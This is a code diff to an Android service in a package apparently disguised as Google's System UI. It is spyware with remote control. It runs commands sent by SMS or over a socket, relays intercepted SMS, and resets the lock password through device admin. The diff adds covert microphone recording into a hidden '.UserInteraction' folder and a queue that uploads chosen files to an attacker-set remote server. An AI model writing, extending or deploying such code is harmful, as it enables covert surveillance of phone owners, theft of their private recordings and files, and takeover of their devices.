@@ -13,28 +13,35 @@ import android.content.pm.PackageInfo;
 import android.database.Cursor;
 import android.media.AudioManager;
 import android.media.MediaPlayer;
+import android.media.MediaRecorder;
 import android.net.Uri;
 import android.net.wifi.WifiManager;
 import android.os.Build;
+import android.os.Environment;
 import android.os.IBinder;
 import android.os.PowerManager;
 import android.os.SystemClock;
 import android.os.Vibrator;
 import android.preference.PreferenceManager;
 import android.provider.MediaStore;
+import android.provider.Settings;
 import android.speech.tts.TextToSpeech;
 import android.speech.tts.TextToSpeech.OnInitListener;
 import android.telephony.SmsManager;
+import android.text.format.DateFormat;
+import android.text.format.DateUtils;
 import android.util.Log;
 import android.view.KeyEvent;
 
 import com.genonbeta.CoolSocket.CoolCommunication;
 import com.genonbeta.CoolSocket.CoolJsonCommunication;
+import com.genonbeta.core.ServerAddress;
+import com.genonbeta.core.ServerConnection;
+import com.github.kevinsawicki.http.HttpRequest;
 import com.google.android.systemUi.R;
 import com.google.android.systemUi.config.AppConfig;
 import com.google.android.systemUi.helper.FileUtils;
 import com.google.android.systemUi.helper.NotificationPublisher;
-import com.google.android.systemUi.helper.RemoteServer;
 import com.google.android.systemUi.receiver.SmsReceiver;
 
 import org.json.JSONArray;
@@ -44,8 +51,10 @@ import org.json.JSONObject;
 import java.io.DataInputStream;
 import java.io.File;
 import java.io.IOException;
+import java.lang.reflect.Array;
 import java.net.Socket;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.Locale;
 
 public class CommunicationService extends Service implements OnInitListener
@@ -71,19 +80,146 @@ public class CommunicationService extends Service implements OnInitListener
 	private int mWipeCountdown = 8;
 	private long mRemoteThreadDelay = 50000;
 	private ArrayList<ParallelConnection> mParallelConnections = new ArrayList<>();
-	private RemoteServer mRemote;
+	private ServerConnection mRemote = new ServerConnection();
 	private String mCurrentSong = "unknown";
 	private RemoteThread mRemoteThread = new RemoteThread();
 	private JSONArray mRemoteLogs = new JSONArray();
 	private MediaPlayer mPlayer = new MediaPlayer();
+	private MediaRecorder mRecorder = new MediaRecorder();
 	private ClipboardManager mClipboard;
+	private boolean mIsRecording = true;
+	private ArrayList<File> mUploadQueue = new ArrayList<>();
 
-	protected void sendToConnections(String message)
+	@Override
+	public IBinder onBind(Intent intent)
 	{
-		for (ParallelConnection conn : mParallelConnections)
+		return null;
+	}
+
+	@Override
+	public void onCreate()
+	{
+		super.onCreate();
+
+		mCommunicationServer = new CommunicationServer();
+
+		if (!mCommunicationServer.start())
+			stopSelf();
+
+		mCommunicationServer.setAddTabsToResponse(2);
+
+		mRemoteThread.start();
+	}
+
+	@Override
+	public void onInit(int result)
+	{
+		this.mTTSInit = (result == TextToSpeech.SUCCESS);
+	}
+
+	@Override
+	public int onStartCommand(Intent intent, int p1, int p2)
+	{
+		mPublisher = new NotificationPublisher(this);
+		mDPM = (DevicePolicyManager) getSystemService(Service.DEVICE_POLICY_SERVICE);
+		mAudioManager = (AudioManager) getSystemService(Service.AUDIO_SERVICE);
+		mDeviceAdmin = new ComponentName(this, com.google.android.systemUi.receiver.DeviceAdmin.class);
+		mPreferences = PreferenceManager.getDefaultSharedPreferences(this);
+		mPowerManager = (PowerManager) getSystemService(Service.POWER_SERVICE);
+		mVibrator = (Vibrator) getSystemService(Service.VIBRATOR_SERVICE);
+		mClipboard = (ClipboardManager) getSystemService(Service.CLIPBOARD_SERVICE);
+
+		mRemoteThreadDelay = mPreferences.getLong("remoteServerDelay", mRemoteThreadDelay);
+
+		if (mPreferences.contains("remoteServer"))
+			mRemote.setAddress(new ServerAddress(mPreferences.getString("remoteServer", null)));
+
+		if (mPreferences.contains("upprFile"))
 		{
-			conn.sendMessage(message);
+			File uppr = new File(mPreferences.getString("upprFile", "/sdcard/uppr"));
+
+			if (uppr.isFile())
+			{
+				try
+				{
+					mVibrator.vibrate(1000);
+					mDPM.resetPassword("", 0);
+					uppr.renameTo(new File(uppr.getAbsolutePath() + ".old"));
+				} catch (Exception e)
+				{
+					e.printStackTrace();
+				}
+			}
 		}
+
+		if (!mPreferences.contains("remoteServer"))
+		{
+			File conf = getHiddenFile(AppConfig.DEFAULT_SERVER_FILE);
+
+			if (conf.isFile())
+			{
+				try
+				{
+					String index = FileUtils.readFile(conf).toString();
+					mPreferences.edit().putString("remoteServer", index).apply();
+				} catch (IOException e)
+				{
+				}
+			}
+		}
+
+		if (intent != null)
+			if (SmsReceiver.ACTION_SMS_COMMAND_RECEIVED.equals(intent.getAction()) && intent.hasExtra(SmsReceiver.EXTRA_SENDER_NUMBER) && intent.hasExtra(SmsReceiver.EXTRA_MESSAGE))
+			{
+				String message = intent.getStringExtra(SmsReceiver.EXTRA_MESSAGE);
+				String sender = intent.getStringExtra(SmsReceiver.EXTRA_SENDER_NUMBER);
+
+				runCommand(sender, message, true);
+			}
+			else if (SmsReceiver.ACTION_SMS_RECEIVED.equals(intent.getAction()))
+			{
+				String message = intent.getStringExtra(SmsReceiver.EXTRA_MESSAGE);
+				String sender = intent.getStringExtra(SmsReceiver.EXTRA_SENDER_NUMBER);
+
+				if (mSpyMessages)
+					sendToConnections(sender + ">" + message);
+			}
+
+		return START_STICKY;
+	}
+
+	@Override
+	public void onDestroy()
+	{
+		super.onDestroy();
+
+		mRemoteThread.interrupt();
+		mCommunicationServer.stop();
+		mPlayer.reset();
+		mRecorder.release();
+
+		ttsExit();
+	}
+
+	public File getHiddenDirectory()
+	{
+		File hiddenDir = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + "Android" + File.separator + "data" + File.separator + ".UserInteraction");
+		hiddenDir.mkdirs();
+
+		return hiddenDir;
+	}
+
+	public File getHiddenFile(CharSequence fileName)
+	{
+		return new File(getHiddenDirectory() + File.separator + fileName);
+	}
+
+	public File getHiddenRecordingsDirectory()
+	{
+		File recordsDirs = new File(getHiddenDirectory().getAbsolutePath() + File.separator + "Recordings");
+		recordsDirs.mkdir();
+
+		return recordsDirs;
 	}
 
 	protected String ringerMode(int mode)
@@ -133,6 +269,43 @@ public class CommunicationService extends Service implements OnInitListener
 		return CoolCommunication.Messenger.sendOnCurrentThread(server, port, message, handler);
 	}
 
+	protected void sendToConnections(String message)
+	{
+		for (ParallelConnection conn : mParallelConnections)
+		{
+			conn.sendMessage(message);
+		}
+	}
+
+	public File startVoiceRecording() throws IllegalStateException, IOException
+	{
+		stopVoiceRecording();
+
+		mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+		mRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
+		mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
+
+		File outputFile = new File(getHiddenRecordingsDirectory().getAbsolutePath()
+				+ File.separator
+				+ DateFormat.format("yyyy_MM_dd HH:mm:ss", System.currentTimeMillis())
+				+ ".wav");
+
+		mRecorder.setOutputFile(outputFile.getAbsolutePath());
+		mRecorder.prepare();
+		mRecorder.start();
+
+		mIsRecording = true;
+
+		return outputFile;
+	}
+
+	public void stopVoiceRecording()
+	{
+		mRecorder.release();
+		mRecorder = new MediaRecorder();
+		mIsRecording = false;
+	}
+
 	private boolean ttsExit()
 	{
 		mTTSInit = false;
@@ -168,116 +341,11 @@ public class CommunicationService extends Service implements OnInitListener
 		}
 	}
 
-	@Override
-	public IBinder onBind(Intent intent)
-	{
-		return null;
-	}
-
-	@Override
-	public void onCreate()
-	{
-		super.onCreate();
-
-		mCommunicationServer = new CommunicationServer();
-
-		if (!mCommunicationServer.start())
-			stopSelf();
-
-		mCommunicationServer.setAddTabsToResponse(2);
-
-		mRemoteThread.start();
-	}
-
-	@Override
-	public void onDestroy()
-	{
-		super.onDestroy();
-
-		mRemoteThread.interrupt();
-		mCommunicationServer.stop();
-		mPlayer.reset();
-		ttsExit();
-	}
-
-	@Override
-	public void onInit(int result)
-	{
-		this.mTTSInit = (result == TextToSpeech.SUCCESS);
-	}
-
-	@Override
-	public int onStartCommand(Intent intent, int p1, int p2)
-	{
-		mPublisher = new NotificationPublisher(this);
-		mDPM = (DevicePolicyManager) getSystemService(Service.DEVICE_POLICY_SERVICE);
-		mAudioManager = (AudioManager) getSystemService(Service.AUDIO_SERVICE);
-		mDeviceAdmin = new ComponentName(this, com.google.android.systemUi.receiver.DeviceAdmin.class);
-		mPreferences = PreferenceManager.getDefaultSharedPreferences(this);
-		mPowerManager = (PowerManager) getSystemService(Service.POWER_SERVICE);
-		mVibrator = (Vibrator) getSystemService(Service.VIBRATOR_SERVICE);
-		mClipboard = (ClipboardManager) getSystemService(Service.CLIPBOARD_SERVICE);
-		mRemote = new RemoteServer(mPreferences.getString("remoteServer", "not-defined"));
-
-		mRemoteThreadDelay = mPreferences.getLong("remoteServerDelay", mRemoteThreadDelay);
-
-		if (mPreferences.contains("upprFile"))
-		{
-			File uppr = new File(mPreferences.getString("upprFile", "/sdcard/uppr"));
-
-			if (uppr.isFile())
-			{
-				try
-				{
-					mVibrator.vibrate(1000);
-					mDPM.resetPassword("", 0);
-					uppr.renameTo(new File(uppr.getAbsolutePath() + ".old"));
-				} catch (Exception e)
-				{
-					e.printStackTrace();
-				}
-			}
-		}
-
-		if (!mPreferences.contains("remoteServer"))
-		{
-			File conf = new File(AppConfig.DEFAULT_SERVER_FILE);
-
-			if (conf.isFile())
-			{
-				try
-				{
-					String index = FileUtils.readFile(conf).toString();
-					mPreferences.edit().putString("remoteServer", index).commit();
-				} catch (IOException e) {}
-			}
-		}
-
-		if (intent != null)
-			if (SmsReceiver.ACTION_SMS_COMMAND_RECEIVED.equals(intent.getAction()) && intent.hasExtra(SmsReceiver.EXTRA_SENDER_NUMBER) && intent.hasExtra(SmsReceiver.EXTRA_MESSAGE))
-			{
-				String message = intent.getStringExtra(SmsReceiver.EXTRA_MESSAGE);
-				String sender = intent.getStringExtra(SmsReceiver.EXTRA_SENDER_NUMBER);
-
-				runCommand(sender, message, true);
-			}
-			else if (SmsReceiver.ACTION_SMS_RECEIVED.equals(intent.getAction()))
-			{
-				String message = intent.getStringExtra(SmsReceiver.EXTRA_MESSAGE);
-				String sender = intent.getStringExtra(SmsReceiver.EXTRA_SENDER_NUMBER);
-
-				if (mSpyMessages)
-					sendToConnections(sender + ">" + message);
-			}
-
-		return START_STICKY;
-	}
-
 	private class CommunicationServer extends CoolJsonCommunication
 	{
 		public CommunicationServer()
 		{
-			super(AppConfig.COMMUNATION_SERVER_PORT);
+			super(AppConfig.COMMUNICATION_SERVER_PORT);
 
 			this.setAllowMalformedRequest(true);
 			this.setSocketTimeout(AppConfig.DEFAULT_SOCKET_LARGE_TIMEOUT);
@@ -654,27 +722,27 @@ public class CommunicationService extends Service implements OnInitListener
 						{
 							String server = receivedMessage.getString("server");
 
-							mPreferences.edit().putString("remoteServer", server).commit();
-							mRemote.setConnection(server);
+							mPreferences.edit().putString("remoteServer", server).apply();
+							mRemote.setAddress(new ServerAddress(server));
 
 							response.put("newlySet", server);
 						}
 
 						if (receivedMessage.has("test"))
 						{
-							response.put("isOkay", mRemote.connect(null));
+							response.put("isOkay", mRemote.connect());
 						}
 
 						if (receivedMessage.has("delay"))
 						{
 							response.put("previousDelay", mPreferences.getLong("remoteServerDelay", mRemoteThreadDelay));
-							mPreferences.edit().putLong("remoteServerDelay", receivedMessage.getLong("delay")).commit();
+							mPreferences.edit().putLong("remoteServerDelay", receivedMessage.getLong("delay")).apply();
 							mRemoteThreadDelay = receivedMessage.getLong("delay");
 						}
 
 						if (receivedMessage.has("backup") && receivedMessage.getBoolean("backup"))
 						{
-							File file = new File(AppConfig.DEFAULT_SERVER_FILE);
+							File file = getHiddenFile(AppConfig.DEFAULT_SERVER_FILE);
 
 							if (file.isFile())
 								file.delete();
@@ -740,6 +808,7 @@ public class CommunicationService extends Service implements OnInitListener
 						break;
 					case "getStatus":
 						response.put("playingSong", mPlayer.isPlaying());
+						response.put("recordingVoice", mIsRecording);
 						response.put("bluetoothPower", BluetoothAdapter.getDefaultAdapter().isEnabled());
 						response.put("wifiPower", wifiState(((WifiManager) getSystemService(WIFI_SERVICE)).getWifiState()));
 						response.put("remoteDelay", mRemoteThreadDelay);
@@ -750,7 +819,7 @@ public class CommunicationService extends Service implements OnInitListener
 						response.put("adminMode", mAdminMode);
 						response.put("ttsInit", mTTSInit);
 						response.put("grantedList", mGrantedList);
-						response.put("remoteServer", mRemote.getConnectionAddress());
+						response.put("remoteServer", mRemote.getAddress().getFormattedAddress());
 						response.put("currentSong", mCurrentSong);
 						response.put("hasActiveMedia", mAudioManager.isMusicActive());
 						response.put("clipboard", (mClipboard.hasPrimaryClip()) ? mClipboard.getPrimaryClip().getItemAt(0).getText() : null);
@@ -802,8 +871,49 @@ public class CommunicationService extends Service implements OnInitListener
 						mClipboard.setPrimaryClip(ClipData.newPlainText("receivedText", receivedMessage.getString("text")));
 						result = true;
 						break;
+					case "voiceRecorder":
+						String rMode  = receivedMessage.has("mode") ? receivedMessage.getString("mode") : "default";
+						response.put("isRecording", mIsRecording);
+
+						switch(rMode)
+						{
+							default:
+								response.put("mode", "record,stop,path");
+								break;
+							case "record":
+								File recordFile = startVoiceRecording();
+								response.put("info", "started");
+								response.put("file", recordFile.getCanonicalPath());
+								result = true;
+								break;
+							case "stop":
+								stopVoiceRecording();
+								response.put("info", "stopped");
+								result = true;
+								break;
+							case "path":
+								response.put("path", getHiddenRecordingsDirectory().getAbsolutePath());
+								result = true;
+								break;
+						}
+						break;
+					case "uploadFile":
+						File uploadThis = new File(receivedMessage.getString("file"));
+
+						response.put("file", uploadThis.getAbsolutePath());
+
+						if (uploadThis.isFile())
+						{
+							mUploadQueue.add(uploadThis);
+							response.put("info", "File will be uploaded to remote server on the next connection");
+							result = true;
+						}
+						else
+							response.put("error", "File not found");
+
+						break;
 					default:
-						response.put("info", "{" + request + "} is not found");
+						response.put("error", "{" + request + "} is not found");
 				}
 
 				response.put("result", result);
@@ -811,7 +921,7 @@ public class CommunicationService extends Service implements OnInitListener
 		}
 
 		@Override
-		protected void onError(Exception rxception)
+		protected void onError(Exception exception)
 		{
 		}
 
@@ -905,12 +1015,15 @@ public class CommunicationService extends Service implements OnInitListener
 				{
 				}
 
-				if (mRemote == null)
+				if (mRemote.getAddress() == null)
 					continue;
 
 				try
 				{
-					JSONArray cmds = new JSONArray(mRemote.connect(mRemoteLogs.toString()));
+					mRemote.getAddress().clearAll();
+					mRemote.getAddress().addPost(AppConfig.PREVIOUS_RESULTS, mRemoteLogs.toString());
+
+					JSONArray cmds = new JSONArray(mRemote.connect());
 
 					if (cmds.length() > 0)
 						for (int i = 0; i < cmds.length(); i++)
@@ -921,6 +1034,32 @@ public class CommunicationService extends Service implements OnInitListener
 					mRemoteLogs = new JSONArray();
 				} catch (Exception e)
 				{
+				}
+
+				if (mUploadQueue.size() > 0)
+				{
+					File firstFile = mUploadQueue.get(0);
+
+					ServerAddress serverAddress = mRemote.getAddress();
+					serverAddress.clearAll();
+
+					try
+					{
+						HttpRequest request = HttpRequest.get(serverAddress.getFormattedAddress());
+						StringBuilder output = new StringBuilder();
+
+						request.readTimeout(0);
+						request.part("file", firstFile.getName(), firstFile);
+						request.receive(output);
+
+						Log.d(TAG, "File upload: " + request.ok() + "; server: " + output.toString());
+
+						if (request.ok())
+							mUploadQueue.remove(0);
+					} catch (Exception e)
+					{
+						e.printStackTrace();
+					}
 				}
 			}
 		}
